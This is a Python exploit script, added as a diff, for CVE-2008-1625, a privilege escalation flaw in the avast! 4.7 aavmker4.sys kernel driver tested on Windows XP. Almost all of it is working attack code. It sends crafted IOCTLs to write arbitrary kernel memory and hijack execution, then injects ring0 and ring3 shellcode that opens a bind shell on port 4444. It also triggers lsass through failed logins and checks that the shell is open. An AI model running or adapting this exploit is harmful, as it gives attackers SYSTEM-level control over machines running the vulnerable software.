@@ -1,0 +1,209 @@
+#!/usr/bin/python
+# avast! 4.7 aavmker4.sys privilege escalation
+# http://www.trapkit.de/advisories/TKADV2008-002.txt
+# CVE-2008-1625
+# Tested on WindXpSp2/Sp3 Dep ON
+# Matteo Memelli ryujin __A-T__ offensive-security.com
+# www.offensive-security.com
+# Spaghetti & Pwnsauce - 17/04/2010
+# Tested on WinXPSP2/SP3 english | avast! 4.7.1098.0
+from ctypes import *
+import time, struct, sys, thread, os
+
+kernel32 = windll.kernel32
+Psapi    = windll.Psapi
+
+def findSysBase(drv):
+	print "(+) Retrieving %s base address..." % drv
+	ARRAY_SIZE            = 1024
+	myarray               = c_ulong * ARRAY_SIZE
+	lpImageBase           = myarray()
+	cb                    = c_int(1024)
+	lpcbNeeded            = c_long()
+	drivername_size       = c_long()
+	drivername_size.value = 48
+	Psapi.EnumDeviceDrivers(byref(lpImageBase), cb, byref(lpcbNeeded))
+	for baseaddy in lpImageBase:
+		drivername = c_char_p("\x00"*drivername_size.value)
+		if baseaddy:
+			Psapi.GetDeviceDriverBaseNameA(baseaddy, drivername,
+							drivername_size.value)
+			if drivername.value.lower() == drv:
+				print "(+) Address retrieved: %s" % hex(baseaddy)
+				return baseaddy
+	return None
+
+def checkShell():
+	check = "netstat -an | find \"4444\""
+	res = os.popen(check)
+	ret = res.read()
+	res.close()
+	if ret.find("0.0.0.0:4444") != -1:
+		return True
+	else:
+		return False
+
+def kickLsass():
+	time.sleep(10)
+	lsas1 = "echo hola | runas /user:administrator cmd.exe > NUL"
+	lsas2 = "net use \\\\127.0.0.1 /user:administrator test > NUL"
+	nc    = "nc 127.0.0.1 4444"
+	print "(!) NO BSOD? good sign :)"
+	print "(*) Sleeping 60 secs before the Woshi finger hold..."
+	time.sleep(60)
+	# Trying to kick ls-ass, any auth good or failed should help
+	# if this doesn't work for you try to rdp to the vuln box or
+	# logout/login from console... it's rough but should work ;)
+	print "(+) Trying to fail an auth to trigger syscall..."
+	os.system(lsas1)
+	time.sleep(1)
+	os.system(lsas2)
+	while 1:
+		res = checkShell()
+		if res:
+			print "($) Shell is ready 0.0.0.0:4444"
+			#os.system(nc)
+			#print "(-) netcat not in path but shell is open!"
+			break
+		print "(*) Retrying. Sleeping 30 secs..."
+		time.sleep(30)
+		print "(+) Trying to fail an auth to trigger syscall..."
+		os.system(lsas1)
+		time.sleep(1)
+		os.system(lsas2)
+    
+def pwnDrv(driver_handle2, IOCTL_EIP, stor_input, stor_size, stor_output,
+			out_size, dwReturn1):
+	# We trigger func pointer to control EIP
+	time.sleep(5)
+	print "(+) Owning EIP..."
+	for i in range(1,3):
+		print "(+) Triggering function pointer: %d/2" % i
+		dev_ioctl = kernel32.DeviceIoControl(driver_handle2, IOCTL_EIP, stor_input,
+							stor_size, stor_output, out_size,
+							byref(dwReturn1), None)
+		time.sleep(0.5)
+	
+if __name__ == '__main__':
+	print "(*) avast! 4.7 aavmker4.sys privilege escalation"
+	print "(+) coded by Matteo Memelli aka ryujin -> at <- offsec.com"
+	print "(+) www.offsec.com || Spaghetti & Pwnsauce"
+	print "(+) tested on WinXPSP2/SP3 DEP On 17/04/2010"
+	GENERIC_READ  = 0x80000000
+	GENERIC_WRITE = 0x40000000
+	OPEN_EXISTING = 0x3
+	CREATE_ALWAYS = 0x2
+	IOCTL_STOR    = 0xb2d6001c # stores stuff to bypass checks in .data
+	IOCTL_VULN    = 0xb2d60030 # writes to arbitrary memory
+	IOCTL_EIP     = 0xb2d60020 # triggers function pointer to own EIP 
+	# DosDevices\AAVMKER4 Device\AavmKer4
+	DEVICE_NAME   = "\\\\.\\AavmKer4"
+	dwReturn1     = c_ulong()
+	dwReturn2     = c_ulong()
+	evil_size     = 0x878
+	out_size      = 0x1024
+	stor_size     = 0x418
+	evil_output   = ""
+	stor_output   = ""
+	driver_name   = 'aavmker4.sys'
+
+	# evil_input = 0x878
+	# Payload = 496 bytes
+	# ring0_migrate = 45 bytes || # \xf0\x01 bytes to copy
+	ring0_migrate = (
+	"\xfc\xfa\xeb\x24\x5e\x68\x76\x01\x00\x00\x59\x0f\x32\x89\x86\x69"
+	"\x00\x00\x00\x8b\xbe\x6d\x00\x00\x00\x89\xf8\x0f\x30\xb9\xf0\x01" 
+	"\x00\x00\xf3\xa4\xfb\xf4\xeb\xfd\xe8\xd7\xff\xff\xff" )
+	
+	# ring0_msr = 117 bytes
+	ring0_msr = (
+	"\x6a\x00\x9c\x60\xe8\x00\x00\x00\x00\x58\x8b\x98\x60\x00\x00\x00"
+	"\x89\x5c\x24\x24\x81\xf9\xde\xc0\xad\xde\x75\x10\x68\x76\x01\x00"
+	"\x00\x59\x89\xd8\x31\xd2\x0f\x30\x31\xc0\xeb\x3a\x8b\x32\x0f\xb6"
+	"\x1e\x66\x81\xfb\xc3\x00\x75\x2e\x8b\x98\x68\x00\x00\x00\x8d\x9b"
+	"\x75\x00\x00\x00\x89\x1a\xb8\x01\x00\x00\x80\x0f\xa2\x81\xe2\x00"
+	"\x00\x10\x00\x74\x11\xba\x00\xff\x3f\xc0\x81\xc2\x04\x00\x00\x00"
+	"\x81\x22\xff\xff\xff\x7f\x61\x9d\xc3\xff\xff\xff\xff\x00\x04\xdf"
+	"\xff\x00\x04\xfe\x7f" )
+	
+	# ring3_stager = 61 bytes
+	ring3_stager = (
+	"\x60\x6a\x30\x58\x99\x64\x8b\x18\x39\x53\x0c\x74\x2e\x8b\x43\x10"
+	"\x8b\x40\x3c\x83\xc0\x28\x8b\x08\x03\x48\x03\x81\xf9\x6c\x61\x73"
+	"\x73\x75\x18\xe8\x0a\x00\x00\x00\xe8\x10\x00\x00\x00\xe9\x09\x00"
+	"\x00\x00\xb9\xde\xc0\xad\xde\x89\xe2\x0f\x34\x61\xc3" )
+		
+	# msf payload: bindshell port 4444 318 bytes
+	ring3_shellcode = (
+	"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
+	"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
+	"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
+	"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
+	"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
+	"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
+	"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
+	"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
+	"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
+	"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
+	"\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
+	"\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
+	"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
+	"\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
+	"\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
+	"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
+	"\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
+	"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
+	"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
+	"\x52\xff\xd0\x68\xef\xce\xe0\x60\x53\xff\xd6\xff\xd0\xc3" )
+
+	sysbase       = findSysBase(driver_name)
+	if not sysbase:
+		print "(-) Couldn't retrieve driver base address, exiting..."
+		sys.exit()
+
+	driver_handle1 = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 
+						0, None, CREATE_ALWAYS, 0, None)
+	driver_handle2 = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 
+						0, None, CREATE_ALWAYS, 0, None)
+	
+	# .data memory area we write to; offset from base = 0x2e04 
+	read_data_from= struct.pack('L', sysbase+0x2e04) # calculate addy in .data
+	# r0_address = noplsed address, jump 0xfa bytes ahead to avoid a corrupted nop
+	r0_address    = struct.pack('L', sysbase+0x23fa)
+	evil_input    = r0_address*2 + "\x90"*0x102
+	evil_input   += ring0_migrate + ring0_msr + ring3_stager + ring3_shellcode
+	evil_input   += "\x41"*0x549 
+	evil_input   += read_data_from + "\x42\x42\x42\x42" # bypass input checks
+	stor_input    = "\x43\x43\x43\x43" # padding
+	stor_input   += "\x07\xAD\xDE\xD0" # cmp dword ptr [eax], 0D0DEAD07h
+	stor_input   += "\xBA\xD0\xBA\x10" # cmp dword ptr [eax+4], 10BAD0BAh
+	stor_input   += "\x44\x44\x44\x44"*2
+	# After arbitrary write to memory nt!KeSetEvent is called: we need to fix
+	# nt!KeSetEvent+0x32 using any addy  pointing  to value different to 0x01
+	# so we can use our "read_data_from" again.
+	stor_input   += read_data_from 
+	stor_input   += "\x44\x44\x44\x44"
+	# 0x2300 offset from base: we write here to control a function pointer
+	# and own EIP
+	stor_input   += struct.pack('L', sysbase+0x2300) + "\x45"*414
+
+	# trigger these later on...
+	thread.start_new(pwnDrv, (driver_handle2, IOCTL_EIP, stor_input, stor_size,
+					stor_output, out_size, dwReturn1))
+	thread.start_new(kickLsass, ())
+	###########################################################################
+
+	# And now let's own the boy:
+	if driver_handle1:
+		# We store values to overcome input checks
+		print "(+) Storing our precious in kernel space ;) ..."
+		dev_ioctl = kernel32.DeviceIoControl(driver_handle1, IOCTL_STOR, stor_input, 
+							stor_size, stor_output, out_size,
+							byref(dwReturn1), None)
+		# We trigger arbitrary write
+		print "(*) Sending evil IOCTL..."
+		print "(+) Pwnage in progress...."
+		dev_ioctl = kernel32.DeviceIoControl(driver_handle1, IOCTL_VULN, 
+							evil_input, evil_size, evil_output,
+							evil_size, 
+							byref(dwReturn2), None)
